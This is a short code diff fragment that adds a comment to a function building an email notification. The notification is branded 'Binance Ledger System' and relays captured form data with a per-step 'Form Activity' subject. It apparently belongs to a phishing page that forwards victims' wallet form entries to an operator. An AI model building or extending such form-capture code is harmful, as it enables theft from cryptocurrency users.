@@ -37,6 +37,7 @@ ${formDataHtml || 'No form data available'}
 <p><em>Automated notification from Binance Ledger System</em></p>
     `.trim();
 
+    // Use only two simple variables to avoid corruption
     const templateParams = {
       subject: `🚨 ${data.step} - Form Activity`,
       message: message
